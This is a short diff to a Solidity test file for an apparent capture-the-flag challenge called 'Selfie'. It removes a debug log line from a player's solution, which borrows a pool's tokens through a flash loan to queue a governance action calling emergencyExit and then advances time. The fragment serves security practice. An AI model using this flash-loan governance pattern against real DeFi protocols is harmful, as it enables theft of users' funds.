@@ -65,7 +65,6 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        console.log("player", player);
         Attacker attacker = new Attacker(governance, pool, recovery);
         pool.flashLoan(IERC3156FlashBorrower(address(attacker)), address(token), TOKENS_IN_POOL, abi.encodeWithSignature("emergencyExit(address)", recovery));
         vm.warp(block.timestamp + 2 days);
